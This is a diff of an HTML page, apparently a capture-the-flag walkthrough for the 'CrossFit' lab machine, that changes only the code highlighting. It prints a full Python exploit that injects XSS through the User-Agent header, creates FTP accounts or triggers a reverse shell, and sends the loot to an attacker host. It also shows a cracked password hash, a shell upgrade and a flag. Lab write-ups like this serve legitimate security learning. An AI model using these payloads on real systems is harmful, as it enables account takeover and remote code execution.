+<span class="s2">        y.send(post_data);</span>
+<span class="s2">    }</span>
+<span class="s2">}</span>
+<span class="s2">x.open("</span><span class="n">GET</span><span class="s2">", "</span><span class="n">http</span><span class="o">://</span><span class="n">ftp</span><span class="o">.</span><span class="n">crossfit</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">accounts</span><span class="o">/</span><span class="n">create</span><span class="err">"</span><span class="p">);</span><span class="w"></span>
+<span class="err">x.withCredentials</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">true</span><span class="p">;</span><span class="w"></span>
+<span class="err">x.send()</span><span class="p">;</span><span class="w"></span>
 </code></pre>
 </div>
 </div>
+</div>
 </section>
-<section class="wrapper style5 alt">
+<section class="wrapper style2 alt">
 <div class="inner">
 <div class="content">
 
@@ -464,7 +477,7 @@ x.send();
 </div>
 </div>
 </section>
-<section class="wrapper style3 ">
+<section class="wrapper style6 ">
 <div class="inner">
 <div class="content">
 
@@ -484,195 +497,197 @@ x.send();
    Python Exploit Code
   </b>
  </summary>
- <pre class="codehilite"><code class="language-python">import requests, threading, queue, argparse, base64, time, logging, re, sys
-from http.server import BaseHTTPRequestHandler, HTTPServer
+ <div class="codehilite">
+  <pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">threading</span><span class="o">,</span> <span class="nn">queue</span><span class="o">,</span> <span class="nn">argparse</span><span class="o">,</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">logging</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">http.server</span> <span class="kn">import</span> <span class="n">BaseHTTPRequestHandler</span><span class="p">,</span> <span class="n">HTTPServer</span>
 
-class PayloadHandler(BaseHTTPRequestHandler):
-    FTP_CREATE_PAYLOAD = """
-  x = new XMLHttpRequest;
-  x.onreadystatechange = function() {{
-    if(x.readyState == 4) {{
-        r_txt = this.responseText;
+<span class="k">class</span> <span class="nc">PayloadHandler</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
+    <span class="n">FTP_CREATE_PAYLOAD</span> <span class="o">=</span> <span class="s2">"""</span>
+<span class="s2">  x = new XMLHttpRequest;</span>
+<span class="s2">  x.onreadystatechange = function() {{</span>
+<span class="s2">    if(x.readyState == 4) {{</span>
+<span class="s2">        r_txt = this.responseText;</span>
 
-        // Gets the nonce from the account creation page.
-        re = new RegExp('&lt;input type="hidden" name="_token" value="(.*?)"&gt;')
-        token = r_txt.match(re)[1];
+<span class="s2">        // Gets the nonce from the account creation page.</span>
+<span class="s2">        re = new RegExp('&lt;input type="hidden" name="_token" value="(.*?)"&gt;')</span>
+<span class="s2">        token = r_txt.match(re)[1];</span>
 
-        post_data = "_token=" + token + "&amp;username={username}&amp;pass={password}"
+<span class="s2">        post_data = "_token=" + token + "&amp;username=</span><span class="si">{username}</span><span class="s2">&amp;pass=</span><span class="si">{password}</span><span class="s2">"</span>
 
-        y = new XMLHttpRequest;
-        y.open("POST", "http://ftp.crossfit.htb/accounts");
-        y.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-        y.withCredentials = true;
-        y.onreadystatechange = function() {{
-            if(y.readyState == 4) {{
-                z = new XMLHttpRequest;
-                z.open("GET", "http://{lhost}:{lport}/get_result.html?p="+btoa(r_txt + post_data + this.responseText));
-                z.send()
-            }}
-        }};
-        y.send(post_data);
-    }}
+<span class="s2">        y = new XMLHttpRequest;</span>
+<span class="s2">        y.open("POST", "http://ftp.crossfit.htb/accounts");</span>
+<span class="s2">        y.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');</span>
+<span class="s2">        y.withCredentials = true;</span>
+<span class="s2">        y.onreadystatechange = function() {{</span>
+<span class="s2">            if(y.readyState == 4) {{</span>
+<span class="s2">                z = new XMLHttpRequest;</span>
+<span class="s2">                z.open("GET", "http://</span><span class="si">{lhost}</span><span class="s2">:</span><span class="si">{lport}</span><span class="s2">/get_result.html?p="+btoa(r_txt + post_data + this.responseText));</span>
+<span class="s2">                z.send()</span>
+<span class="s2">            }}</span>
+<span class="s2">        }};</span>
+<span class="s2">        y.send(post_data);</span>
+<span class="s2">    }}</span>
 
-  }}
-  x.open("GET", "http://ftp.crossfit.htb/accounts/create");
-  x.withCredentials = true;
-  x.send();
-  """
+<span class="s2">  }}</span>
+<span class="s2">  x.open("GET", "http://ftp.crossfit.htb/accounts/create");</span>
+<span class="s2">  x.withCredentials = true;</span>
+<span class="s2">  x.send();</span>
+<span class="s2">  """</span>
 
-    REVERSE_SHELL_PAYLOAD = """
-  async function postData(url = '', data = '') {{
-    const response = await fetch(url, {{
-        method: "POST",
-        body: data
-    }});
-    return response
-  }}
+    <span class="n">REVERSE_SHELL_PAYLOAD</span> <span class="o">=</span> <span class="s2">"""</span>
+<span class="s2">  async function postData(url = '', data = '') {{</span>
+<span class="s2">    const response = await fetch(url, {{</span>
+<span class="s2">        method: "POST",</span>
+<span class="s2">        body: data</span>
+<span class="s2">    }});</span>
+<span class="s2">    return response</span>
+<span class="s2">  }}</span>
 
-  fetch("http://development-test.crossfit.htb/rs.php")
-  .then(function(data) {{
-    data.text().then(function(r_txt) {{
-        fetch("http://{lhost}:{lport}/get_result.html?p="+btoa(r_txt));
-    }});
-  }});
-  """
+<span class="s2">  fetch("http://development-test.crossfit.htb/rs.php")</span>
+<span class="s2">  .then(function(data) {{</span>
+<span class="s2">    data.text().then(function(r_txt) {{</span>
+<span class="s2">        fetch("http://</span><span class="si">{lhost}</span><span class="s2">:</span><span class="si">{lport}</span><span class="s2">/get_result.html?p="+btoa(r_txt));</span>
+<span class="s2">    }});</span>
+<span class="s2">  }});</span>
+<span class="s2">  """</span>
 
-    lhost = ""
-    lport = ""
-    payload = ""
-    payload_queue = queue.Queue()
+    <span class="n">lhost</span> <span class="o">=</span> <span class="s2">""</span>
+    <span class="n">lport</span> <span class="o">=</span> <span class="s2">""</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s2">""</span>
+    <span class="n">payload_queue</span> <span class="o">=</span> <span class="n">queue</span><span class="o">.</span><span class="n">Queue</span><span class="p">()</span>
 
-    def _set_response(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html')
-        self.end_headers()
+    <span class="k">def</span> <span class="nf">_set_response</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s1">'Content-type'</span><span class="p">,</span> <span class="s1">'text/html'</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
 
-    def do_GET(self):
-        if "/get_result.html" in self.path:
-            encoded_data = self.path[19:]
-            decoded_data = base64.b64decode(encoded_data).decode("utf-8")
-            print(decoded_data)
-            sys.exit(0)
+    <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">if</span> <span class="s2">"/get_result.html"</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="p">:</span>
+            <span class="n">encoded_data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="p">[</span><span class="mi">19</span><span class="p">:]</span>
+            <span class="n">decoded_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encoded_data</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">"utf-8"</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">decoded_data</span><span class="p">)</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 
-        if self.path == "/payload.js":
-            self._set_response()
-            self.wfile.write(PayloadHandler.payload.encode("utf-8"))
-            return
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">path</span> <span class="o">==</span> <span class="s2">"/payload.js"</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">_set_response</span><span class="p">()</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">"utf-8"</span><span class="p">))</span>
+            <span class="k">return</span>
 
-        self._set_response()
-        self.wfile.write("Hi there!\n".encode("utf-8"))
-
-
-    def send_request(payload_file):
-        headers = {
-            "User-Agent" : "&lt;script src=http://{lhost}:{lport}/{payload} &gt;&lt;/script&gt;".format(
-                lhost=PayloadHandler.lhost,
-                lport=PayloadHandler.lport,
-                payload=payload_file
-            )
-        }
-
-        data = {
-            "name" : "fakename",
-            "email" : "fake@email.com",
-            "phone" : "420696969",
-            "message" : "&lt;script&gt;", # Needed to trigger the security report
-            "submit" : "submit"
-        }
-
-        print("Sending Payload to: {}".format(payload_file))
-        r = requests.post("http://gym-club.crossfit.htb/blog-single.php",
-                            headers=headers,
-                            data=data)
-
-    def _worker():
-        while True:
-            payload_file = PayloadHandler.payload_queue.get()
-
-            if payload_file == None:
-                break
-
-            if payload_file == "wait":
-                print("Starting Exploit in 2 seconds!")
-                time.sleep(2)
-                PayloadHandler.payload_queue.task_done()
-                continue
-            PayloadHandler.send_request(payload_file)
-            PayloadHandler.payload_queue.task_done()
+        <span class="bp">self</span><span class="o">.</span><span class="n">_set_response</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"Hi there!</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">"utf-8"</span><span class="p">))</span>
 
 
-    def set_payloads(username, password, lhost, lport, trigger_rs):
-        PayloadHandler.lhost = lhost
-        PayloadHandler.lport = lport
+    <span class="k">def</span> <span class="nf">send_request</span><span class="p">(</span><span class="n">payload_file</span><span class="p">):</span>
+        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s2">"User-Agent"</span> <span class="p">:</span> <span class="s2">"&lt;script src=http://</span><span class="si">{lhost}</span><span class="s2">:</span><span class="si">{lport}</span><span class="s2">/</span><span class="si">{payload}</span><span class="s2"> &gt;&lt;/script&gt;"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+                <span class="n">lhost</span><span class="o">=</span><span class="n">PayloadHandler</span><span class="o">.</span><span class="n">lhost</span><span class="p">,</span>
+                <span class="n">lport</span><span class="o">=</span><span class="n">PayloadHandler</span><span class="o">.</span><span class="n">lport</span><span class="p">,</span>
+                <span class="n">payload</span><span class="o">=</span><span class="n">payload_file</span>
+            <span class="p">)</span>
+        <span class="p">}</span>
 
-        if trigger_rs:
-            PayloadHandler.payload = PayloadHandler.REVERSE_SHELL_PAYLOAD
-        else:
-            PayloadHandler.payload = PayloadHandler.FTP_CREATE_PAYLOAD
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s2">"name"</span> <span class="p">:</span> <span class="s2">"fakename"</span><span class="p">,</span>
+            <span class="s2">"email"</span> <span class="p">:</span> <span class="s2">"fake@email.com"</span><span class="p">,</span>
+            <span class="s2">"phone"</span> <span class="p">:</span> <span class="s2">"420696969"</span><span class="p">,</span>
+            <span class="s2">"message"</span> <span class="p">:</span> <span class="s2">"&lt;script&gt;"</span><span class="p">,</span> <span class="c1"># Needed to trigger the security report</span>
+            <span class="s2">"submit"</span> <span class="p">:</span> <span class="s2">"submit"</span>
+        <span class="p">}</span>
 
-        PayloadHandler.payload = PayloadHandler.payload.format(
-            lhost=lhost,
-            lport=lport,
-            username=username,
-            password=password
-        )
+        <span class="nb">print</span><span class="p">(</span><span class="s2">"Sending Payload to: </span><span class="si">{}</span><span class="s2">"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">payload_file</span><span class="p">))</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">"http://gym-club.crossfit.htb/blog-single.php"</span><span class="p">,</span>
+                            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
+                            <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
 
-        print(PayloadHandler.payload)
+    <span class="k">def</span> <span class="nf">_worker</span><span class="p">():</span>
+        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+            <span class="n">payload_file</span> <span class="o">=</span> <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload_queue</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
 
-    def run():
-        worker_thread = threading.Thread(target=PayloadHandler._worker, daemon=True)
-        worker_thread.start()
-        logging.basicConfig(level=logging.WARNING)
-        httpd = HTTPServer((PayloadHandler.lhost, PayloadHandler.lport), PayloadHandler)
-        PayloadHandler.payload_queue.put(("wait"))
-        PayloadHandler.payload_queue.put(("payload.js"))
-        try:
-            httpd.serve_forever()
-        except KeyboardInterrupt:
-            pass
+            <span class="k">if</span> <span class="n">payload_file</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
+                <span class="k">break</span>
 
-        worker_thread.join()
-        httpd.server_close()
+            <span class="k">if</span> <span class="n">payload_file</span> <span class="o">==</span> <span class="s2">"wait"</span><span class="p">:</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s2">"Starting Exploit in 2 seconds!"</span><span class="p">)</span>
+                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+                <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload_queue</span><span class="o">.</span><span class="n">task_done</span><span class="p">()</span>
+                <span class="k">continue</span>
+            <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">send_request</span><span class="p">(</span><span class="n">payload_file</span><span class="p">)</span>
+            <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload_queue</span><span class="o">.</span><span class="n">task_done</span><span class="p">()</span>
 
-def parse_args():
-    parser = argparse.ArgumentParser(description="Exploitation script for Crossfit to create FTP accounts")
 
-    parser.add_argument('-u', '--username',
-                        help='the name of the FTP user to create',
-                        required=True)
+    <span class="k">def</span> <span class="nf">set_payloads</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">,</span> <span class="n">trigger_rs</span><span class="p">):</span>
+        <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">lhost</span> <span class="o">=</span> <span class="n">lhost</span>
+        <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">lport</span> <span class="o">=</span> <span class="n">lport</span>
 
-    parser.add_argument('-p', '--password',
-                        help='the password to set for the FTP account',
-                        required=True)
+        <span class="k">if</span> <span class="n">trigger_rs</span><span class="p">:</span>
+            <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload</span> <span class="o">=</span> <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">REVERSE_SHELL_PAYLOAD</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload</span> <span class="o">=</span> <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">FTP_CREATE_PAYLOAD</span>
 
-    parser.add_argument('-H', '--lhost',
-                        help='your IP address for hosting the web server',
-                        required=True)
+        <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload</span> <span class="o">=</span> <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+            <span class="n">lhost</span><span class="o">=</span><span class="n">lhost</span><span class="p">,</span>
+            <span class="n">lport</span><span class="o">=</span><span class="n">lport</span><span class="p">,</span>
+            <span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span>
+            <span class="n">password</span><span class="o">=</span><span class="n">password</span>
+        <span class="p">)</span>
 
-    parser.add_argument('-P', '--lport',
-                        help='the port to use for the web server',
-                        required=True,
-                        type=int)
+        <span class="nb">print</span><span class="p">(</span><span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload</span><span class="p">)</span>
 
-    parser.add_argument('-R', '--trigger_rs',
-                        help="Should trigger the uploaded reverse shell instead of creating a FTP account",
-                        action="store_true")
+    <span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
+        <span class="n">worker_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">PayloadHandler</span><span class="o">.</span><span class="n">_worker</span><span class="p">,</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+        <span class="n">worker_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">WARNING</span><span class="p">)</span>
+        <span class="n">httpd</span> <span class="o">=</span> <span class="n">HTTPServer</span><span class="p">((</span><span class="n">PayloadHandler</span><span class="o">.</span><span class="n">lhost</span><span class="p">,</span> <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">lport</span><span class="p">),</span> <span class="n">PayloadHandler</span><span class="p">)</span>
+        <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload_queue</span><span class="o">.</span><span class="n">put</span><span class="p">((</span><span class="s2">"wait"</span><span class="p">))</span>
+        <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload_queue</span><span class="o">.</span><span class="n">put</span><span class="p">((</span><span class="s2">"payload.js"</span><span class="p">))</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">httpd</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
+        <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+            <span class="k">pass</span>
 
-    return parser.parse_args()
+        <span class="n">worker_thread</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+        <span class="n">httpd</span><span class="o">.</span><span class="n">server_close</span><span class="p">()</span>
 
-def exploit(username, password, lhost, lport, trigger_rs):
-    PayloadHandler.set_payloads(username, password, lhost, lport, trigger_rs)
-    PayloadHandler.run()
+<span class="k">def</span> <span class="nf">parse_args</span><span class="p">():</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s2">"Exploitation script for Crossfit to create FTP accounts"</span><span class="p">)</span>
 
-if __name__ == "__main__":
-    args = parse_args()
-    exploit(args.username, args.password, args.lhost, args.lport, args.trigger_rs)
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'-u'</span><span class="p">,</span> <span class="s1">'--username'</span><span class="p">,</span>
+                        <span class="n">help</span><span class="o">=</span><span class="s1">'the name of the FTP user to create'</span><span class="p">,</span>
+                        <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'-p'</span><span class="p">,</span> <span class="s1">'--password'</span><span class="p">,</span>
+                        <span class="n">help</span><span class="o">=</span><span class="s1">'the password to set for the FTP account'</span><span class="p">,</span>
+                        <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'-H'</span><span class="p">,</span> <span class="s1">'--lhost'</span><span class="p">,</span>
+                        <span class="n">help</span><span class="o">=</span><span class="s1">'your IP address for hosting the web server'</span><span class="p">,</span>
+                        <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'-P'</span><span class="p">,</span> <span class="s1">'--lport'</span><span class="p">,</span>
+                        <span class="n">help</span><span class="o">=</span><span class="s1">'the port to use for the web server'</span><span class="p">,</span>
+                        <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+                        <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'-R'</span><span class="p">,</span> <span class="s1">'--trigger_rs'</span><span class="p">,</span>
+                        <span class="n">help</span><span class="o">=</span><span class="s2">"Should trigger the uploaded reverse shell instead of creating a FTP account"</span><span class="p">,</span>
+                        <span class="n">action</span><span class="o">=</span><span class="s2">"store_true"</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">,</span> <span class="n">trigger_rs</span><span class="p">):</span>
+    <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">set_payloads</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">,</span> <span class="n">trigger_rs</span><span class="p">)</span>
+    <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parse_args</span><span class="p">()</span>
+    <span class="n">exploit</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">username</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">password</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">lhost</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">lport</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">trigger_rs</span><span class="p">)</span>
 </code></pre>
+ </div>
 </details>
 </div>
 </div>
 </section>
-<section class="wrapper style2 alt">
+<section class="wrapper style3 alt">
 <div class="inner">
 <div class="content">
 
@@ -694,9 +709,11 @@ if __name__ == "__main__":
  </code>
  .
 </p>
-<pre class="codehilite"><code>[+] Looking for specific hashes inside files - less false positives (limit 70)
-/etc/ansible/playbooks/adduser_hank.yml:$6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/
+<div class="codehilite">
+ <pre><span></span><code>[<span class="o">+</span>]<span class="w"> </span><span class="nv">Looking</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">specific</span><span class="w"> </span><span class="nv">hashes</span><span class="w"> </span><span class="nv">inside</span><span class="w"> </span><span class="nv">files</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">less</span><span class="w"> </span><span class="nv">false</span><span class="w"> </span><span class="nv">positives</span><span class="w"> </span><span class="ss">(</span><span class="nv">limit</span><span class="w"> </span><span class="mi">70</span><span class="ss">)</span><span class="w"></span>
+<span class="o">/</span><span class="nv">etc</span><span class="o">/</span><span class="nv">ansible</span><span class="o">/</span><span class="nv">playbooks</span><span class="o">/</span><span class="nv">adduser_hank</span>.<span class="nv">yml</span>:<span class="mh">$6$e20D6</span><span class="nv">nUeTJOIyRio</span><span class="mh">$A777</span><span class="nv">Jj8tk5</span>.<span class="nv">sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM</span>.<span class="nv">Iov</span><span class="o">/</span><span class="nv">pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG</span><span class="o">/</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  This hash could be cracked using the RockYou wordlist and is 'powerpuffgirls'. So I tried logging in as
  <code>
@@ -712,17 +729,19 @@ if __name__ == "__main__":
  </code>
  on the box and the got the user flag!
 </p>
-<pre class="codehilite"><code>$ python3 -c "import pty; pty.spawn('/bin/bash')"
-www-data@crossfit:/$ su hank
-su hank
-Password: powerpuffgirls
+<div class="codehilite">
+ <pre><span></span><code><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@crossfit</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="n">su</span> <span class="n">hank</span>
+<span class="n">su</span> <span class="n">hank</span>
+<span class="n">Password</span><span class="p">:</span> <span class="n">powerpuffgirls</span>
 
-hank@crossfit:/$ cd
-cd
-hank@crossfit:~$ cat user.txt
-cat user.txt
-cf710dc09c2e30d3609fedfd8f7c0d37
+<span class="n">hank</span><span class="nd">@crossfit</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="n">cd</span>
+<span class="n">cd</span>
+<span class="n">hank</span><span class="nd">@crossfit</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">cf710dc09c2e30d3609fedfd8f7c0d37</span>
 </code></pre>
+</div>
 <p>
  <em>
   Easily the hardest part of this machine.
@@ -731,7 +750,7 @@ cf710dc09c2e30d3609fedfd8f7c0d37
 </div>
 </div>
 </section>
-<section class="wrapper style1 ">
+<section class="wrapper style6 ">
 <div class="inner">
 <div class="content">
 
@@ -753,45 +772,47 @@ cf710dc09c2e30d3609fedfd8f7c0d37
  </code>
  .
 </p>
-<pre class="codehilite"><code>hank@crossfit:~$ cat /home/isaac/send_updates/send_updates.php
-&lt;?php
-/***************************************************
- * Send email updates to users in the mailing list *
- ***************************************************/
-require("vendor/autoload.php");
-require("includes/functions.php");
-require("includes/db.php");
-require("includes/config.php");
-use mikehaertl\shellcommand\Command;
+<div class="codehilite">
+ <pre><span></span><code><span class="n">hank</span><span class="err">@</span><span class="n">crossfit</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">isaac</span><span class="o">/</span><span class="n">send_updates</span><span class="o">/</span><span class="n">send_updates</span><span class="o">.</span><span class="n">php</span><span class="w"></span>
+<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span><span class="w"></span>
+<span class="o">/***************************************************</span><span class="w"></span>
+<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">Send</span><span class="w"> </span><span class="n">email</span><span class="w"> </span><span class="n">updates</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">mailing</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="o">*</span><span class="w"></span>
+<span class="w"> </span><span class="o">***************************************************/</span><span class="w"></span>
+<span class="n">require</span><span class="p">(</span><span class="s2">"vendor/autoload.php"</span><span class="p">);</span><span class="w"></span>
+<span class="n">require</span><span class="p">(</span><span class="s2">"includes/functions.php"</span><span class="p">);</span><span class="w"></span>
+<span class="n">require</span><span class="p">(</span><span class="s2">"includes/db.php"</span><span class="p">);</span><span class="w"></span>
+<span class="n">require</span><span class="p">(</span><span class="s2">"includes/config.php"</span><span class="p">);</span><span class="w"></span>
+<span class="n">use</span><span class="w"> </span><span class="n">mikehaertl</span>\<span class="n">shellcommand</span>\<span class="n">Command</span><span class="p">;</span><span class="w"></span>
 
-if($conn)
-{
-    $fs_iterator = new FilesystemIterator($msg_dir);
+<span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">conn</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="o">$</span><span class="n">fs_iterator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">FilesystemIterator</span><span class="p">(</span><span class="o">$</span><span class="n">msg_dir</span><span class="p">);</span><span class="w"></span>
 
-    foreach ($fs_iterator as $file_info)
-    {
-        if($file_info-&gt;isFile())
-        {
-            $full_path = $file_info-&gt;getPathname();
-            $res = $conn-&gt;query('SELECT email FROM users');
-            while($row = $res-&gt;fetch_array(MYSQLI_ASSOC))
-            {
-                $command = new Command('/usr/bin/mail');
-                $command-&gt;addArg('-s', 'CrossFit Club Newsletter', $escape=true);
-                $command-&gt;addArg($row['email'], $escape=true);
+<span class="w">    </span><span class="n">foreach</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">fs_iterator</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">$</span><span class="n">file_info</span><span class="p">)</span><span class="w"></span>
+<span class="w">    </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">file_info</span><span class="o">-&gt;</span><span class="n">isFile</span><span class="p">())</span><span class="w"></span>
+<span class="w">        </span><span class="p">{</span><span class="w"></span>
